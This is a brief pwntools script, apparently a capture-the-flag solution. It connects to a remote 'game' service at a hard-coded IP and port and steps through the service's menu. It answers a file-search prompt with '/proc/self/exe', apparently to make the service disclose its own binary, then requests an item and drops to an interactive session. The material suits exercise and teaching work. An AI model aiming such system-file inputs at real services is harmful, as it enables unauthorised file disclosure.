# -*- coding: utf-8 -*-
from pwn import *

context(log_level='debug')

#p = process("./game")
p = remote("111.198.29.45",32108)


p.recvuntil('Y/n')
p.sendline('y')
p.recvuntil('Exit')
p.sendline('1')
p.recvuntil('finding?')
p.sendline('/proc/self/exe')
p.recvuntil('Exit')
p.sendline('3')
p.recvuntil('get?')
p.sendline('100')

p.interactive()
